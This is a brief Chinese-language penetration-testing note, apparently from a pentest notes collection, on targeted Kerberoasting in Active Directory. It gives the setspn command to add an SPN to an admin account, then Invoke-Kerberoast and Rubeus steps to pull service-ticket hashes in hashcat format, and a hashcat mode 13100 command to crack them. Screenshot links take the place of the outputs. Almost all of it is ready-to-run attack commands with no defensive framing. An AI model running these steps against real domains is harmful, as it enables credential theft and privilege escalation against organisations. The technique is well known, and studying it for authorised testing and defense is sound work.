	当有setspn权限时，为域用户添加一个SPN
	>setspn -U -A RDP/zone.com godadmin
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/549.png)

	域内任何主机可以使用Kerberoast 获得TGS
	https://github.com/malachitheninja/Invoke-Kerberoast
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/550.png)

	>Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation |Out-File xx.txt
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/551.png)

	或使用rubeus.exe
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/552.png)

	破解
	>hashcat -m 13100 -a 0 kerberos.txt wordlist.txt